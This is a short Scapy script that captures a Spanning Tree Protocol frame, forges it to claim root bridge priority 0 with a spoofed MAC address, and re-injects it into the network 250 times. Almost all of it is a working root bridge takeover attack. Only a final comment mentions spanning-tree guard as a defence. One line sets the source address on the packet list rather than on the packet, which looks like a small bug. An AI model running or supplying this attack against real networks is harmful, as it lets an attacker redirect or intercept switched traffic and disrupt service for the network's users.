from scapy.all import *

#Capture the Spanning Tree Protocol Frame
pkt = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)

#Change the MAC address in the frame to the following:
pkt.src="00:00:00:00:00:01"

#Set Root Id 
pkt[0].rootid=0

#Set Root MAC
pkt[0].rootmac="00:00:00:00:00:01"

#Set Bridge Id
pkt[0].bridgeid=0

#Set rootmac
pkt[0].bridgemac="00:00:00:00:00:01"
pkt[0].show()

#Send changed frame back into network
for i in range(0,250):
    time.sleep(1)
    sendp(pkt[0],loop=0,verbose=1)



#In order to protect the network open network config of the port and enable guard of spanning tree
